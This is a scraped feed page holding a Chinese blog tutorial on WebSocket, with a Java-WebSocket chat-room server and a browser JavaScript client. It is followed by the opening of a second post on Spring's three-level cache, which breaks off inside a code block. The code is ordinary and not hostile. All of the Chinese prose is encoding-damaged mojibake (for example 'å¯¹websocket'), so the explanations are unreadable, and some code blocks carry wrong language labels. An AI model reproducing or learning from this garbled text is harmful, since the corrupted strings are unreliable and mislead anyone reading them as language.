.hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¯¹websocketçš„ç†è§£</h2>
<p>websocketï¼Œä¹Ÿæ˜¯åº”ç”¨å±‚çš„ç½‘ç»œé€šä¿¡åè®®ï¼Œè¦ç†è§£å®ƒæ˜¯ä»€ä¹ˆï¼Œ<strong>å°±è¦é—®ä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™ä¸ªåè®®</strong>ã€‚</p>
<p>åœ¨æ²¡æœ‰websocketä»¥å‰ï¼Œæˆ‘ä»¬éƒ½æ˜¯ç”¨httpåè®®åšæ•°æ®æ”¶å‘ï¼Œæ¸æ¸çš„ï¼Œæˆ‘ä»¬å‘ç°æœ‰ä¸€äº›åœºæ™¯httpçš„ç‰¹æ€§æ— æ³•å¾ˆå¥½åœ°å¤„ç†ã€‚ä¾‹å¦‚ï¼Œ<strong>æœåŠ¡ç«¯æƒ³ä¸»åŠ¨å‘é€ç»™å®¢æˆ·ç«¯ä¿¡æ¯çš„æ—¶å€™æ€ä¹ˆåŠ</strong>ï¼Ÿå¦‚æœç”¨httpæ¥å¤„ç†è¿™ä¸ªåœºæ™¯ï¼Œå°±æ¶‰åŠåˆ°å®¢æˆ·ç«¯æ–¹é¢çš„è½®è¯¢ã€‚</p>
<p>ä½†æ˜¯è½®è¯¢çš„é€»è¾‘æ˜¯æŒ‰ç…§ä¸€å®šçš„é¢‘ç‡ï¼Œå®¢æˆ·ç«¯ä¸æ–­åœ°å‘é€è¯·æ±‚åŒ…ï¼Œå»çœ‹æœåŠ¡ç«¯æ˜¯å¦â€œæœ‰è¯å¯¹æˆ‘ä»¬è¯´â€ã€‚</p>
<p>è¿™å¸¦æ¥äº†ä¸¤ä¸ªä¸»è¦çš„é—®é¢˜ï¼š</p>
<p>ç¬¬ä¸€ï¼ŒæœåŠ¡ç«¯ä½•æ—¶å‘é€æ•°æ®æ˜¯ä¸ç¡®å®šçš„ï¼Œé•¿æ—¶é—´æŒç»­åœ°å‘é€è¯·æ±‚æŸ¥è¯¢ï¼Œå…¶ä¸­å¤§é‡çš„è¯·æ±‚æ˜¯æ— æ•ˆçš„ï¼Œç½‘ç»œåˆ©ç”¨ç‡ä½ä¸‹ã€‚</p>
<p>ç¬¬äºŒï¼Œå¯¹äºéœ€è¦å®æ—¶å‘é€çš„ä¿¡æ¯ï¼Œè½®è¯¢åªèƒ½å‘¨æœŸæ€§åœ°è·å–ï¼Œå¦‚æœæœåŠ¡ç«¯æƒ³è¦å‘é€ä¿¡æ¯ï¼Œéœ€è¦ç­‰åˆ°ä¸‹ä¸€ä¸ªè½®è¯¢å‘¨æœŸæ‰å¯ä»¥ï¼Œä¼šé€ æˆä¿¡æ¯çš„å»¶è¿Ÿã€‚å¦‚æœæ˜¯åœ¨çº¿æ¸¸æˆï¼Œè§†é¢‘èŠå¤©ä»€ä¹ˆçš„ï¼Œç”¨æˆ·å½“å¤©å°±ä¼šæ‰“ä¸ªå·®è¯„å†å¸è½½æ‰ã€‚</p>
<p>æ‰€ä»¥ï¼Œå…³é”®æ˜¯è¦åšåˆ°å½“æœåŠ¡ç«¯æƒ³å‘é€çš„æ—¶å€™ï¼Œå°±ç«‹åˆ»ä¸»åŠ¨åœ°å‘é€ä¿¡æ¯ã€‚</p>
<p>è€Œwebsocketå°±èƒ½è¾¾æˆè¿™ä¸€åŠŸèƒ½ï¼Œå®ƒçš„ç‰¹æ€§æ˜¯<strong>å…¨åŒå·¥é€šä¿¡</strong>ï¼Œæ­¤å¤–è¿˜æœ‰<strong>ä½å»¶è¿Ÿï¼Œæ•°æ®åŒ…ä¼ è¾“æ•ˆç‡é«˜</strong>çš„ç‰¹æ€§ã€‚è¿™äº›ç‰¹æ€§éƒ½æ˜¯ç›¸è¾ƒäºhttpåè®®æ¥è¯´çš„ï¼Œä½ å¯ä»¥è¿™ä¹ˆè®¤ä¸ºï¼Œæƒ³è¦ä¸“é—¨åº”å¯¹éœ€è¦é«˜æ•ˆå…¨åŒå·¥äº¤äº’çš„åº”ç”¨åœºæ™¯ï¼Œä½†httpè¡¨ç¤ºè‡£å¦¾åšä¸åˆ°å•Šï¼Œæ‰€ä»¥ä½ æ–°çº³ä¸€ä¸ªå«”å¦ƒwebsocketï¼Œä¸“é—¨å¸®ä½ å¹²è¿™äº›æ´»å„¿ã€‚</p>
<p>å¦‚æœä¹‹å‰é™¤äº†httpåè®®ä»¥å¤–æ²¡æœ‰æ¥è§¦è¿‡åº”ç”¨å±‚åè®®ï¼Œé‚£ä¹ˆä¸€å¼€å§‹æ˜¯éš¾ä»¥æ¥å—websocketæ¦‚å¿µçš„ã€‚ä¸ºäº†æ›´å¥½åœ°ç†è§£ï¼Œéœ€è¦è·Ÿhttpåšä¸€äº›å…³é”®çš„å¯¹æ¯”ã€‚</p>
<ol>
<li>httpæ˜¯è¯·æ±‚-å“åº”æ¨¡å¼ï¼Œå¿…é¡»è¦æœ‰è¯·æ±‚ï¼Œæ‰æœ‰å›å¤ï¼ˆä¸”æœåŠ¡ç«¯ä¸èƒ½ä¸»åŠ¨è¯·æ±‚ï¼‰ã€‚websocketæ˜¯å…¨åŒå·¥é€šä¿¡çš„ï¼Œæœ‰ä¿¡æ¯å°±ä¸»åŠ¨ä¼ è¾¾ç»™å¯¹æ–¹ã€‚</li>
<li>httpçŸ­è¿æ¥ï¼ˆä¸€æ¬¡æ¥å›åå°±é»˜è®¤å…³é—­è¿æ¥ï¼‰ã€‚websocketæ˜¯é•¿è¿æ¥ã€‚</li>
<li>httpæ˜¯æ— çŠ¶æ€ã€‚websocketæ˜¯æœ‰çŠ¶æ€çš„ã€‚</li>
</ol>
<h2 data-id="heading-1">websocketæ˜¯å¦‚ä½•å·¥ä½œçš„</h2>
<ol>
<li>å‘å‡ºè¿æ¥è¯·æ±‚ï¼Œå®¢æˆ·ç«¯å‘é€çš„ç¬¬ä¸€ä¸ªè¯·æ±‚ï¼Œæ˜¯ä¸€ä¸ªhttpè¯·æ±‚ï¼Œä¸æ™®é€šhttpä¸åŒçš„æ˜¯</li>
</ol>

<pre><code class="hljs language-arduino" lang="arduino">Upgrade: websocket  <span class="hljs-comment">// upgradeæ˜¯ä¸€ä¸ªhttpæ ‡å‡†å¤´éƒ¨ï¼ŒæŒ‡å®šå¸Œæœ›å‡çº§åˆ°çš„åè®®</span>
Connection: Upgrade <span class="hljs-comment">// connectionè®¾å®šå®Œæˆåè®®å‡çº§åæ˜¯å¦ä¿æŒè¿æ¥</span>
</code></pre>
<p>2.  æœåŠ¡å™¨åŒæ„æ¡æ‰‹çš„å“åº”</p>

<pre><code class="hljs language-arduino" lang="arduino">Upgrade: websocket          <span class="hljs-comment">// ç¡®è®¤å‡çº§åˆ° WebSocket</span>
Connection: Upgrade         <span class="hljs-comment">// æ ¸å¿ƒï¼šç¡®è®¤è¿æ¥å·²å‡çº§</span>
</code></pre>
<p>3.  é€šä¿¡é˜¶æ®µ</p>
<p>æ ¸å¿ƒæŠ¥æ–‡æ•°æ®ï¼š</p>
<ul>
<li><strong>FINï¼šæ˜¯å¦æ˜¯ç»“æŸå¸§ï¼ŒFIN=0è¡¨ç¤ºè¿˜æœ‰åç»­ï¼ŒFIN=1è¡¨ç¤ºæ˜¯æœ€åä¸€ä¸ªæ•°æ®å¸§</strong></li>
<li><strong>Opcodeï¼šå¸§ç±»å‹ï¼Œæ•°æ®ç±»å‹ï¼ˆå³è¿™ä¸ªæ•°æ®åŒ…æ˜¯å¹²ä»€ä¹ˆçš„ï¼‰</strong></li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/84be00b42379458fbf88e8b7c9514c50~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5om_5b2x:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768878190&amp;x-signature=ccLZMoJAFIIWXx7udNcMlduQiA8%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li><strong>Maskï¼Œæ˜¯å¦æ©ç ,1è¡¨ç¤ºæ˜¯æ©ç ï¼Œæ©ç æ˜¯å°†æ•°æ®æŠ¥æ–‡å†…å®¹è½¬æ¢ï¼Œè€Œéæ˜¯åŠ å¯†</strong></li>
</ul>
<ol start="4">
<li>è¿æ¥å…³é—­</li>
</ol>
<p>ä¸€ç«¯å‘é€å…³é—­å¸§ï¼Œå¦ä¸€ç«¯æ¥å—åˆ°å…³é—­å¸§åï¼Œå‘é€å“åº”å…³é—­å¸§ã€‚å¯¹è¯ä¹‹åTCPæ–­è¿ã€‚</p>
<h2 data-id="heading-2">ä»£ç å®ç°ä¸€ä¸‹websocket</h2>
<p>ç°åœ¨é€šè¿‡javaçš„æ–¹å¼æ¥å†™ä¸€ä¸ªwebsocketæ¡ˆä¾‹ã€‚</p>
<p>çº¯websocketçš„å®ç°ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">&lt;--ä¾èµ–åŒ…--&gt;
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.java-websocket<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Java-WebSocket<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.5.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span> 
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></span>
</code></pre>

<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebsocketChatRoom</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">WebSocketServer</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-title class_">WebsocketChatRoom</span>(int port) {
        <span class="hljs-variable language_">super</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InetSocketAddress</span>(port));
    }


    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">onOpen</span>(<span class="hljs-params">WebSocket webSocket, ClientHandshake clientHandshake</span>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"æ–°è¿æ¥åˆ°è¾¾ï¼š"</span>+ webSocket.<span class="hljs-title function_">getRemoteSocketAddress</span>());
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">onClose</span>(<span class="hljs-params">WebSocket webSocket, int i, <span class="hljs-built_in">String</span> s, <span class="hljs-built_in">boolean</span> b</span>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"è¿æ¥å…³é—­ï¼š"</span> + webSocket.<span class="hljs-title function_">getRemoteSocketAddress</span>());
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">onMessage</span>(<span class="hljs-params">WebSocket webSocket, <span class="hljs-built_in">String</span> s</span>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"æ”¶åˆ°ä¿¡æ¯ï¼š"</span> + s);
        <span class="hljs-comment">// websocketServerè‡ªå¸¦çš„å¹¿æ’­å®ç°</span>
        <span class="hljs-title function_">broadcast</span>(s);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">onError</span>(<span class="hljs-params">WebSocket webSocket, Exception e</span>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"è¿æ¥é”™è¯¯ï¼š "</span>+e.<span class="hljs-title function_">getMessage</span>());
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">onStart</span>(<span class="hljs-params"/>) {

    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) {
        int port = <span class="hljs-number">8888</span>;
        <span class="hljs-title class_">WebsocketChatRoom</span> server = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebsocketChatRoom</span>(port);
        server.<span class="hljs-title function_">start</span>();
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"èŠå¤©å®¤ï¼Œå¯åŠ¨ï¼: "</span> + port);
    }
}
</code></pre>
<p>ä¸Šè¿°çš„é‡ç‚¹æ˜¯ç»§æ‰¿WebSocketServerï¼Œå®ƒå®šä¹‰å¤šä¸ªæ¥å£ï¼Œæ¯ä¸ªæ¥å£æœ›æ–‡ç”Ÿä¹‰ï¼Œå³å„è‡ªè¿æ¥é˜¶æ®µåšçš„äº‹æƒ…ã€‚æœ€é‡è¦çš„æ˜¯onMessageï¼Œå‚æ•°ä¸ºè¿æ¥ä¿¡æ¯å’ŒæŠ¥æ–‡æ–‡æœ¬ã€‚</p>
<p>ä½œä¸ºåç«¯å¼€å‘ï¼Œæˆ‘ä»¬å†è¯·å‡ºdeepseekå¤§ç¥å¸®æˆ‘ä»¬å†™ä¸€ä¸ªå‰ç«¯èŠå¤©çª—å£ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9df13865e96146d6b1f8c77e34a51f74~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5om_5b2x:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768878190&amp;x-signature=4Dpg6SjpAe5hutUQRbJXFqMdaNs%3D" alt="image.png" loading="lazy"/></p>
<p>é‡è¦çš„æ˜¯å‰ç«¯è¿æ¥é€»è¾‘ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">// åˆ›å»ºè¿æ¥
<span class="hljs-attr">socket</span> = new WebSocket(serverUrl)<span class="hljs-comment">;</span>

// websocketå„é˜¶æ®µçš„å¤„ç†å™¨
<span class="hljs-attr">socket.onopen</span> = (event) =&gt; {
    console.log('WebSocket connection opened:', event)<span class="hljs-comment">;</span>
    <span class="hljs-attr">statusIndicator.className</span> = <span class="hljs-string">'status-indicator connected'</span><span class="hljs-comment">;</span>
    <span class="hljs-attr">statusText.textContent</span> = <span class="hljs-string">'Connected to server'</span><span class="hljs-comment">;</span>
    <span class="hljs-attr">sendButton.disabled</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
    
    // Add connection message to chat
    addMessage('System', 'Connected to the WebSocket server', 'received')<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>

<span class="hljs-attr">socket.onmessage</span> = (event) =&gt; {
    console.log('Message from server:', event.data)<span class="hljs-comment">;</span>
    
    addMessage('Server', event.data, 'received')<span class="hljs-comment">;</span>
    
    // Auto-scroll to bottom
    <span class="hljs-attr">chatBox.scrollTop</span> = chatBox.scrollHeight<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>

<span class="hljs-attr">socket.onclose</span> = (event) =&gt; {
    console.log('WebSocket connection closed:', event)<span class="hljs-comment">;</span>
    <span class="hljs-attr">statusIndicator.className</span> = <span class="hljs-string">'status-indicator'</span><span class="hljs-comment">;</span>
    <span class="hljs-attr">statusText.textContent</span> = <span class="hljs-string">'Disconnected from server'</span><span class="hljs-comment">;</span>
    <span class="hljs-attr">sendButton.disabled</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
    
    // Add disconnection message to chat
    addMessage('System', 'Disconnected from the server', 'received')<span class="hljs-comment">;</span>
    
    // Try to reconnect after 5 seconds
    setTimeout(() =&gt; {
        if (!socket || <span class="hljs-attr">socket.readyState</span> === WebSocket.CLOSED) {
            <span class="hljs-attr">statusText.textContent</span> = <span class="hljs-string">'Reconnecting...'</span><span class="hljs-comment">;</span>
            initWebSocket()<span class="hljs-comment">;</span>
        }
    }, 5000)<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>

<span class="hljs-attr">socket.onerror</span> = (error) =&gt; {
    console.error('WebSocket error:', error)<span class="hljs-comment">;</span>
    <span class="hljs-attr">statusText.textContent</span> = <span class="hljs-string">'Connection error'</span><span class="hljs-comment">;</span>
    <span class="hljs-attr">sendButton.disabled</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c50b433c88624e86993e354e12dc3e91~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5om_5b2x:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768878190&amp;x-signature=nCyK7VRbxdgoCsZfWFVNtkEfO30%3D" alt="image.png" loading="lazy"/></p>
<p>æ‰“å¼€ä¸¤ä¸ªçª—å£ï¼Œæ‰“å¼€æ—¶ä¼šåˆ›å»ºè‡ªå·±çš„ç”¨æˆ·åï¼Œç„¶ååœ¨èŠå¤©å®¤å‘é€ä¿¡æ¯ï¼Œå³å¯åŒæ­¥ä¿¡æ¯äº†ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä½ çœŸçš„ç†è§£Springä¸‰çº§ç¼“å­˜å—]]></title>    <link>https://juejin.cn/post/7594358540048547875</link>    <guid>https://juejin.cn/post/7594358540048547875</guid>    <pubDate>2026-01-13T03:09:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594358540048547875" data-draft-id="7594303923362660392" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä½ çœŸçš„ç†è§£Springä¸‰çº§ç¼“å­˜å—"/> <meta itemprop="keywords" content="åç«¯,é¢è¯•"/> <meta itemprop="datePublished" content="2026-01-13T03:09:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="omenkk7"/> <meta itemprop="url" content="https://juejin.cn/user/933901076016858"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä½ çœŸçš„ç†è§£Springä¸‰çº§ç¼“å­˜å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/933901076016858/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    omenkk7
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T03:09:38.000Z" title="Tue Jan 13 2026 03:09:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Springä¸‰çº§ç¼“å­˜ï¼šå¾ªç¯ä¾èµ–çš„è§£å†³æ–¹æ¡ˆ</h2>
<p>åœ¨Springæ¡†æ¶ä¸­ï¼Œå¾ªç¯ä¾èµ–æ˜¯Beanåˆ›å»ºè¿‡ç¨‹ä¸­å¸¸è§çš„é—®é¢˜ é’ˆå¯¹è¿™ç§é—®é¢˜ æˆ‘ä»¬å¯ä»¥é€šè¿‡ç¼–ç æ‰‹æ®µå»è§£å†³</p>
<p>è€ŒSpringä¹Ÿä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ç§è§£å†³æ‰‹æ®µ ä¹Ÿå°±æ˜¯<strong>ä¸‰çº§ç¼“å­˜</strong></p>
<p>æœ¬æ–‡å°†ä»ç¼“å­˜è®¾è®¡ã€è§£å†³é€»è¾‘ã€å¹¶å‘å®‰å…¨åŠåœºæ™¯é™åˆ¶ç­‰ç»´åº¦ï¼Œè¯¦ç»†è§£æä¸‰çº§ç¼“å­˜çš„å·¥ä½œåŸç†ã€‚</p>
<h3 data-id="heading-1">ä¸€ã€ä¸‰çº§ç¼“å­˜çš„æ ¸å¿ƒè®¾è®¡ç›®çš„</h3>
<p>ä¸‰çº§ç¼“å­˜æ˜¯Springä¸ºè§£å†³<strong>Beanå¾ªç¯ä¾èµ–</strong>é—®é¢˜ä¸“é—¨è®¾è®¡çš„ç¼“å­˜ä½“ç³»ï¼Œå…¶æ ¸å¿ƒæ€è·¯æ˜¯é€šè¿‡â€œå¯¹è±¡åˆå§‹åŒ–å»¶åâ€çš„æ–¹å¼ï¼Œ</p>
<p>åœ¨Beanæœªå®Œå…¨åˆå§‹åŒ–æ—¶æå‰æš´éœ²å¼•ç”¨ï¼Œä»è€Œæ‰“ç ´å¾ªç¯ä¾èµ–çš„æ­»é”ã€‚</p>
<h3 data-id="heading-2">äºŒã€ä¸‰çº§ç¼“å­˜çš„å®šä¹‰ä¸èŒè´£</h3>
<p>Springåœ¨<code>DefaultSingletonBeanRegistry</code>ç±»ä¸­å®šä¹‰äº†ä¸‰çº§ç¼“å­˜ï¼Œå„è‡ªæ‰¿æ‹…ä¸åŒèŒè´£ï¼š</p>
<pre><code class="hljs language-scala" lang="scala">public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DefaultSingletonBeanRegistry</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">SimpleAliasRegistry</span> <span class="hljs-title">implements</span> <span class="hljs-title">SingletonBeanRegistry</span> </span>{
    <span class="hljs-keyword">private</span> static <span class="hljs-keyword">final</span> int <span class="hljs-type">SUPPRESSED_EXCEPTIONS_LIMIT</span> = <span class="hljs-number">100</span>;
    
    <span class="hljs-comment">// ä¸€çº§ç¼“å­˜ï¼šä¿å­˜**å®Œå…¨åˆå§‹åŒ–å®Œæˆ**çš„å•ä¾‹Beanï¼ˆæœ€ç»ˆå¯ç”¨çŠ¶æ€ï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Map</span>&lt;<span class="hljs-type">String</span>, <span class="hljs-type">Object</span>&gt; singletonObjects = <span class="hljs-keyword">new</span> <span class="hljs-type">ConcurrentHashMap</span>(<span class="hljs-number">256</span>);
    
    <span class="hljs-comment">// äºŒçº§ç¼“å­˜ï¼šä¿å­˜**åŠæˆå“Bean**ï¼ˆå®ä¾‹åŒ–å®Œæˆã€æœªåˆå§‹åŒ–çš„æ—©æœŸå¼•ç”¨ï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Map</span>&lt;<span class="hljs-type">String</span>, <span class="hljs-type">Object</span>&gt; earlySingletonObjects = <span class="hljs-keyword">new</span> <span class="hljs-type">ConcurrentHashMap</span>(<span class="hljs-number">16</span>);
    
